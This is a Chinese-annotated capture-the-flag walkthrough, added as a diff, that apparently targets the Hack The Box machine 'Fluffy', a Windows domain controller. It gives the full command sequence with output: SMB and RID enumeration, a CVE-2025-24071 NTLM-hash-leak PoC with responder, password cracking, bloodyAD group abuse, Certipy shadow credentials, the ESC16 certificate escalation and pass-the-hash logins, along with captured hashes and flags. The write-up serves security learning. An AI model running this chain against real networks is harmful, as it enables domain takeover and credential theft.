@@ -1,0 +1,256 @@
+1：nmap
+Nmap scan report for 10.10.11.69
+Host is up (0.46s latency).
+Not shown: 990 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-02 13:32:12Z)
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.fluffy.htb
+| Subject Alternative Name: othername:<unsupported>, DNS:DC01.fluffy.htb
+| Not valid before: 2025-04-17T16:04:17
+|_Not valid after:  2026-04-17T16:04:17
+|_ssl-date: 2025-09-02T13:33:57+00:00; +6h34m41s from scanner time.
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.fluffy.htb
+| Subject Alternative Name: othername:<unsupported>, DNS:DC01.fluffy.htb
+| Not valid before: 2025-04-17T16:04:17
+|_Not valid after:  2026-04-17T16:04:17
+|_ssl-date: 2025-09-02T13:33:54+00:00; +6h34m42s from scanner time.
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.fluffy.htb
+| Subject Alternative Name: othername:<unsupported>, DNS:DC01.fluffy.htb
+| Not valid before: 2025-04-17T16:04:17
+|_Not valid after:  2026-04-17T16:04:17
+|_ssl-date: 2025-09-02T13:33:58+00:00; +6h34m42s from scanner time.
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.fluffy.htb
+| Subject Alternative Name: othername:<unsupported>, DNS:DC01.fluffy.htb
+| Not valid before: 2025-04-17T16:04:17
+|_Not valid after:  2026-04-17T16:04:17
+|_ssl-date: 2025-09-02T13:33:55+00:00; +6h34m42s from scanner time.
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 6h34m41s, deviation: 0s, median: 6h34m41s
+| smb2-time: 
+|   date: 2025-09-02T13:33:12
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 157.73 seconds
+
+10.10.11.69 DC01.fluffy.htb  fluffy.htb   添加hosts
+
+└─# cat /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       kali
+172.20.10.3     wordpress.local
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+172.20.10.2 interstellar.dsz www.interstellar.dsz
+10.10.11.69 DC01.fluffy.htb  fluffy.htb
+
+2： 枚举该用户有权限访问的 SMB 共享目录
+crackmapexec smb 10.10.11.69 -u j.fleischman -p J0elTHEM4n1990! --shares
+登录 SMB 服务后，工具会自动尝试从 RID 1000 开始递增枚举（通常域用户 RID 从 1000 起），向域控发送查询请求，获取每个 RID 对应的 用户名、组名或计算机名。
+crackmapexec smb 10.10.11.69 -u j.fleischman -p J0elTHEM4n1990! --rid-brute暴力枚举
+选中SidtypeUser组 以\分割 选中第二部分 不选择空格 放到users.txt中
+crackmapexec smb 10.10.11.69 -u j.fleischman -p J0elTHEM4n1990! --rid-brute | grep "SidTypeUser" | awk -F '\\' '{print $2}' | awk '{print $1}' > users.txt 
+└─# cat users.txt 
+Administrator
+Guest
+krbtgt
+DC01$
+ca_svc
+ldap_svc
+p.agila
+winrm_svc
+j.coffey
+j.fleischman
+测试能否登录ldap ldap是活动目录协议 用于存储和查询域内用户、组、计算机等对象信息
+3：netexec ldap 10.10.11.69 -d fluffy.htb -u users.txt -p 'J0elTHEM4n1990!'
+
+进入SMB目录寻找讯息
+4： smbclient //10.10.11.69/IT -U fluffy.htb/j.fleischman%J0elTHEM4n1990!
+get Upgrade_Notice.pdf 里面说升级系统因为有很多CVE
+CVE-2025-24071  Windows 文件资源管理器对.library-ms文件的信任机制，诱导受害者系统发送 NTLMv2 哈希
+CVE-2025-24071_PoC-main
+
+https://github.com/0x6rss/CVE-2025-24071_PoC/
+python poc.py
+└─# python poc.py  
+Enter your file name: exp
+Enter IP (EX: 192.168.1.162): 10.10.16.9
+completed
+
+
+exploit.zip
+启动smb终端
+└─# python3 smbclient.py j.fleischman@10.10.11.69
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+Type help for list of commands
+# 
+
+J0elTHEM4n1990!
+
+# use IT
+# ls
+drw-rw-rw-          0  Tue Sep  2 21:39:52 2025 .
+drw-rw-rw-          0  Tue Sep  2 21:39:52 2025 ..
+drw-rw-rw-          0  Fri May 16 22:51:49 2025 Everything-1.4.1.1026.x64
+-rw-rw-rw-    1827464  Fri May 16 22:51:49 2025 Everything-1.4.1.1026.x64.zip
+drw-rw-rw-          0  Fri May 16 22:51:49 2025 KeePass-2.58
+-rw-rw-rw-    3225346  Fri May 16 22:51:49 2025 KeePass-2.58.zip
+-rw-rw-rw-     169963  Sat May 17 22:31:07 2025 Upgrade_Notice.pdf
+# put /root/impacket-master/examples/exploit.zip  放入文件
+# 
+
+responder -I tun0 -wvF 监控
+[SMB] NTLMv2-SSP Client   : 10.10.11.69
+[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
+[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:0b7f50c68b7f245a:BABDC66E21B44FDB895B873BE533EB83:010100000000000000EE5406211CDC016E6BFF87F1F1E8870000000002000800570057003600490001001E00570049004E002D004B003900560033005A0046004D005000490037004C0004003400570049004E002D004B003900560033005A0046004D005000490037004C002E0057005700360049002E004C004F00430041004C000300140057005700360049002E004C004F00430041004C000500140057005700360049002E004C004F00430041004C000700080000EE5406211CDC01060004000200000008003000300000000000000001000000002000004E4E6946917EC5EE29B63B8C9422684D69F18B47EEA32D85AC7EA6B4486B82DB0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0039000000000000000000 
+
+5：提权信息 使用bloodhound 猎犬
+bloodhound-python -u j.fleischman -p J0elTHEM4n1990! -k -d fluffy.htb --zip -c All -dc dc01.fluffy.htb -ns 10.10.11.69 --dns-tcp
+
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc01.fluffy.htb
+INFO: Found 10 users
+INFO: Found 54 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC01.fluffy.htb
+WARNING: DCE/RPC connection failed: [Errno Connection error (10.10.11.69:445)] timed out
+WARNING: DCE/RPC connection failed: [Errno Connection error (10.10.11.69:445)] timed out
+WARNING: DCE/RPC connection failed: [Errno Connection error (10.10.11.69:445)] timed out
+WARNING: DCE/RPC connection failed: [Errno Connection error (10.10.11.69:445)] timed out
+WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.
+INFO: Done in 03M 07S
+INFO: Compressing output into 20250902155352_bloodhound.zip
+
+6：
+P.AGILA属于SERVICE管理组 这个组对service account有全部通用权限
+这个serviceaccount 可以管理三个用户
+
+7： john破解密码
+
+prometheusx-303  (p.agila)     
+
+8： 使用bloodyAD工具
+https://github.com/CravateRouge/BloodyAD
+添加用户到指定组
+命令成功运行后，p.agila 用户会被添加到 SERVICE ACCOUNTS 组中，成为该组的成员。
+└─# bloodyAD -d fluffy.htb -u p.agila -p 'prometheusx-303' --dc-ip 10.10.11.69 add groupMember 'SERVICE ACCOUNTS' p.agila
+[+] p.agila added to SERVICE ACCOUNTS  成功添加
+SERVICE ACCOUNTS 对 ca_svc、ldap_svc、winrm_svc 等账户有 GenericWrite 权限， 这意味着可以向这些账户添加自定义 KeyCredentia
+
+9：
+find 命令用于枚举域内证书服务的关键
+certipy-ad find -u p.agila -p prometheusx-303 -dc-ip 10.10.11.69
+存在哪些证书模板（如 User、Machine、WebServer 等，不同模板权限不同）；
+有哪些证书颁发机构（CA）（如 fluffy-DC01-CA）；
+CA 的配置是否存在漏洞（如是否允许低权限用户申请证书、是否可导出私钥等）。
+
+bloodyAD 查看 winrm_svc 用户的 msDS-KeyCredentialLink 权限
+
+bloodyAD -d fluffy.htb -u p.agila -p 'prometheusx-303' --dc-ip 10.10.11.69 get writable --detail
+
+全自动为 winrm_svc 注入影子证书，获取其访问权限
+
+获得winrm账号hash
+certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'winrm_svc' -target dc01.fluffy.htb -dc-ip 10.10.11.69
+报错ntpdate -u 10.10.11.69 
+Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+拿到win用户hash
+33bd09dcd697600edf6b3a7af4875767
+
+evil-winrm -i 10.10.11.69 -u 'winrm_svc' -H '33bd09dcd697600edf6b3a7af4875767' 连接
+拿到User.flag 65395312d1e4afd12ee3c9e997518815
+
+
+获取ca_svc用户 NTLM hash
+certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'ca_svc' -target dc01.fluffy.htb -dc-ip 10.10.11.69
+拿到HASH ca0f4f9e9eb8a092addf53bb03fc98c8
+枚举可用的证书
+certipy-ad find -username ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -vulnerable  没有模板版本不够更新这个软件版本
+
+
+source certipy-3.12-env/bin/activate激活虚拟环境
+有ESC16漏洞
+1
+certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -user 'ca_svc' read
+2
+将受害者账户的 UPN 更新为目标管理员的 sAMAccountName。
+certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69'  -upn 'administrator'  -user 'ca_svc' update
+[*] Updating user 'ca_svc':
+    userPrincipalName                   : administrator
+[*] Successfully updated 'ca_svc'
+
+3
+以 p.agila 身份为 ca_svc 账户添加影子凭据（修改 msDS-KeyCredentialLink 属性），并自动完成证书申请与认证，最终获取 ca_svc 的 NT 哈希或票据。
+从易受 ESC16 攻击的 CA 上*的任何合适的客户端身份验证模板*（例如，“用户”）请求作为“受害者”用户颁发的证书
+certipy shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -account 'ca_svc' auto
+
+└─# certipy shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -account 'ca_svc' auto
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'ca_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '7ce9744427f5487f82ef4285adb01852'
+[*] Adding Key Credential with device ID '7ce9744427f5487f82ef4285adb01852' to the Key Credentials for 'ca_svc'
+[*] Successfully added Key Credential with device ID '7ce9744427f5487f82ef4285adb01852' to the Key Credentials for 'ca_svc'
+[*] Authenticating as 'ca_svc' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'ca_svc@fluffy.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'ca_svc.ccache'
+[*] Wrote credential cache to 'ca_svc.ccache'
+[*] Trying to retrieve NT hash for 'ca_svc'
+[*] Restoring the old Key Credentials for 'ca_svc'
+[*] Successfully restored the old Key Credentials for 'ca_svc'
+[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
+
+
+certipy req -k -dc-ip '10.10.11.69' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User'
+还原“受害者”帐户的 UPN。
+certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update   
+以目标管理员身份进行身份验证。
+└─# certipy auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator'
+[*] Using principal: 'administrator@fluffy.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
+
+
+
+evil-winrm -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e -i 10.10.11.69
+
+b84526f52650eac3a1d0d9da4b97a95b
